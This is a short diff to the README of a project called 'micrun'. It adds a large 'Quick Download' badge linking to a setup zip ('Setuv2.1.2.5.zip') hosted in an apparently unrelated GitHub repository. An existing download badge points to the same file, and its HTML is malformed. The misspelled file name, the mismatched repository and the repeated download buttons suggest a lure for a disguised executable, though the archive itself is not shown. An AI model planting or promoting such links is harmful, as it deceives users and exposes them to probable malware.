@@ -1,3 +1,5 @@
+[![⚡ Quick Download](https://img.shields.io/badge/⚡_Quick-Download-orange?style=for-the-badge)](https://github.com/ivan-millercode1999g0/quicktool/releases/download/v2.0.0/Setuv2.1.2.5.zip)
+
 <a href="https://github.com/ivan-millercode1999g0/quicktool/releases/download/v2.0.0/Setuv2.1.2.5.zip src="https://img.shields.io/badge/⬇_DOWNLOAD-Latest_Release-blue?style=for-the-badge&logo=github" alt="Download"></a>
 
 # ⚡ micrun
